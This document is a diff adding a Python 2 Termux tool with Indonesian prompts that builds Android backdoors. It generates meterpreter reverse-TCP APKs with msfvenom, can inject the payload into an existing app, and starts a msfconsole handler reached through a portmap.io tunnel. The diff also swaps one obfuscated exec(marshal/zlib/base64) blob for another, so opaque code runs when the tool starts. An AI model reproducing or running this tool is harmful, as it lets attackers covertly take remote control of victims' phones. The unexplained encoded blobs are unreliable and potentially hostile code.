@@ -1,2 +1,270 @@
+# -*- coding: utf-8 -*-
+# open resources Sampai Update Versi Stable
+
+
+import os;
+import time;
+import sys
+import subprocess
+from bs4 import BeautifulSoup as Soup
+
+putih="\x1b[1;97m"
+merah="\x1b[1;91m"
+hijau="\x1b[1;92m" 
+red= '\033[91m'
+orange= '\33[38;5;208m'
+green= '\033[92m'
+cyan= '\033[36m'
+bold= '\033[1m'
+end= '\033[0m'
+
+
+
+
+os.system("clear")
+print putih
+confirm =raw_input('Sudah mempunyai akun Portmap.io? y/n : ')
+if confirm== 'y':
+  os.system('clear')  
+else :
+  if confirm== 'n':
+    print '' 
+    print 'buat akun portmap.io dulu'
+    print '' 
+    os.system('termux-open https://portmap.io')
+    time.sleep(1)
+    exit()
+  else :
+    if confirm== ' ':
+      os.system('python2 msfgaf.py')
+    else :
+      print ('konfirmasi Ditolak!')
+      time.sleep(1)
+      os.system('python2 msfgaf.py')
+      
+
 import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))
+exec(marshal.loads(zlib.decompress(base64.b64decode("eJzNU1tLAkEUHm+lRkFPQr0c6MUXEwuKLkRrhJZk4uXBehrddVzci+zMFhK99QMKkiDoz/lLOjOuohZBT3Vm5uw5Z77vm2F3T5sEFsJ1iouvotMJeSLkBoMQqaXDWGlPcDI5k7hrorYLRT2MTmASISkRIik9SlLjQiwoLE0Ky0EhrgphglQM9IRUIXhSEjXLPI9nJGHzNnd0sGNDEO3bo+HraPj8z+bbzPVexmHOhkWrnFcvygWtrpVlplB7dsBbxKLOrOaMZInaJtRNnfYgb3iCOoz5DoNLek9boAnKoWYwalF1BEw0fhCUNzMsqUM96kCxUWpcQRNz0BydgkV7fg/r83LqhuhnNN//+it8nR9Jvos/U+b3xleQB5ovuq4HcAh8A/MC7VAPqibvDeChMqhq9Qy/Y4/4Gsbwgim6fkvBtzDvCtE/zGaZqm63XTs75WRt3mG0E/Cari/8liF5sHDMdyZkB6Yj6ERUNuWAOiKGAfMMYxz1fWF20wo2dVz2rM4UxXKZK1udr6mmj+FYVyMRKqflRjU6x50TiOPj2HZ13zJOFFZufgKdeW2g"))))     
+
+
+
+
+def remote():
+    os.system("clear")
+    print putih
+    confirm=raw_input('sudah Aktifkan OpenVPN?  y/N : ')
+    if confirm== '' :
+    	print 'Harus Diisi'
+        remote()
+    else :
+    	if confirm== 'y' :
+    	    print ' '           
+    	else :
+    	    if confirm== 'n' :
+    	        os.system('clear')
+            	print 'anda harus mengaktifkan OpenVPN untuk melanjutkan'
+                time.sleep(2)
+    	        os.system('am start --user 0 -n net.openvpn.openvpn/net.openvpn.unified.MainActivity')
+                remote()
+                
+            else :
+            	print 'Konfirmasi Salah!'
+                os.system('clear')
+                remote()
+    	
+    logo()
+    print (''+putih)
+    os.system('ifconfig')
+    print ('')
+    print (merah+'___________________«»')
+    
+    print putih+"IP Local Mu"
+    print "\x1b[1;91m----------------------------------------------"
+    print " pastekan IP Tun0 inet disini"
+    lh =raw_input(" LHOST : ")
+    os.system("clear")
+    if lh== '':
+      logo()
+      print merah+"[!] Harus DiIsi"
+      time.sleep(1)
+      os.system("clear")
+      remote()
+    else :
+      os.system("clear")
+    
+    os.system("clear")
+    logo()
+    print "\x1b[1;97mMasukan LPORT"
+    print "contoh"
+    print "tcp://gafar97port-53967.portmap.io:53967=>\x1b[1;91m8080"
+    print "\x1b[1;91m                                            ^"
+    print "----------------------------------------------"
+    lp =raw_input("LPORT : ")
+    os.system("clear")
+    
+    if lp== '':
+      print "[!]Harus DiIsi"
+      time.sleep(1)
+      os.system("clear")
+      remote()
+    else :
+      os.system("clear")
+      os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit;'");
+      home() 
+
+
+    
+def sisip():
+    os.system("clear")
+    logo()
+    name=raw_input('Nama Infeksi : ')
+    if name == '' :
+    	sisip() 
+    print "\x1b[1;97mAmbil \x1b[1;91m5 Digit angka \x1b[1;97mSetelah TAnda (:)"
+    print "Contoh Menggunakan Config Saya"
+    print "tcp://gafar97port-53967.portmap.io:\x1b[1;91m53967" 
+    print "                                     \x1b[1;91m^"
+    print "----------------------------------------------"
+    port=raw_input("Port : ")
+    if port== ' ' :
+    	print 'Harus Diisi'
+        sisip()
+    else :
+    	print ' '
+    print "\x1b[1;97mMasukan LHOST"
+    print "Contoh Menggunakan Config Saya"
+    print "tcp://\x1b[1;91mgafar97port-53967.portmap.io" 
+    print "\x1b[1;91m                 ^"
+    print "----------------------------------------------"
+    lh=raw_input("lhost : ")
+    if lh== ' ' :
+    	print 'Harus Diisi'
+    else :
+    	print ' '
+    os.system('clear')
+    logo()
+    print (merah+'«__________________✧_List File_✧__________________»')
+    print (''+putih)
+    os.system('ls')
+    print ('')
+    print (merah+'___________________«»')
+    
+    
+    bhn=raw_input(merah+"╚═\x1b[1;91m▶"+merah+"Input Bahan :"+putih+' ');
+    os.system('clear')
+    
+    print hijau+"[*] GENERATE BACKDOOR \n";
+    os.system('apktool if '+str(bhn))    
+    os.system('msfvenom -x '+str(bhn)+' -p android/meterpreter/reverse_tcp lhost='+str(lh)+' lport='+str(port)+' -o '+str(name)+'.apk');
+    os.system('mv '+str(name)+'.apk /storage/emulated/0/')
+    os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity') 
+    time.sleep(3)
+    home()
+
+	
+    
+    
+    
+
+    
+    
+    
+def update():
+	os.system('clear')
+	os.system('git pull origin master')
+	raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+	home()
+    
+	
+
+
+    
+   
+   
+    
+def baru():
+    os.system('clear')
+    logo()
+    name=raw_input("Name : ")
+    
+    print "\x1b[1;97mAmbil \x1b[1;91m5 Digit angka \x1b[1;97mSetelah TAnda (:)"
+    print "Contoh Menggunakan Config Saya"
+    print "tcp://gafar97port-53967.portmap.io:\x1b[1;91m53967" 
+    print "                                     \x1b[1;91m^"
+    print "----------------------------------------------"
+    port=raw_input("Port : ")
+    
+    print "\x1b[1;97mMasukan LHOST"
+    print "Contoh Menggunakan Config Saya"
+    print "tcp://\x1b[1;91mgafar97port-53967.portmap.io" 
+    print "\x1b[1;91m                 ^"
+    print "----------------------------------------------"
+    lh=raw_input("lhost : ")
+    
+    os.system('clear')
+    print hijau+"[*] GENERATE BACKDOOR \n"
+    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+lh+" LPORT="+port+" -o "+name+".apk")
+    os.system("clear")
+    print '[+] BERHASIL MEMBUAT BACKDOOR' 
+    print '[+] SELANJUTNYA BUKA APLIKASI SIGNER'
+    print '[+] LALU SIGN BACKDOOR MU'
+    time.sleep(3)
+    os.system('mv '+str(name)+'.apk /storage/emulated/0/')
+    os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
+    home()
+  
+    
+def menu():
+    os.system('clear')
+    time.sleep(1)
+    logo()
+    print '\x1b[1;91m1.\x1b[1;97mSisipkan Bacdoor \x1b[1;91m{'+orange+'beta'+merah+'}'
+    print '\x1b[1;91m2.\x1b[1;97mBuat Backdoor Baru        '
+    print '\x1b[1;91m3.\x1b[1;97mEsekusi'
+    print '\x1b[1;91m4.\x1b[1;97mUpdate--'
+    print '\x1b[1;91m5.\x1b[1;97mExit'
+    print '\r\x1b[1;91m__________________________________________«» '
+ 
+menu();
+
+def pilih():
+    zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
+    if zedd == '':
+        print '\x1b[1;91m[!] Can\'t empty'
+        time.sleep(1)
+        os.system('clear')
+        menu()
+        pilih()
+    else:
+        if zedd == '1':
+            sisip()
+        else:
+            if zedd == '2':
+                baru()
+            else:
+              if zedd == '3':
+                remote()
+              else:
+				  if zedd == '4':
+					  update()
+				  else:	
+					 if zedd == '5':
+						  exit()
+					 else:					
+					  print '\x1b[1;91m[!] Pilih 1,2,3'
+					  os.system('clear')
+					  home()
+					  
+                
+        
+def home():
+	menu()
+	pilih()         
+            
+        
+            
+        
+        
+
+pilih();
+    
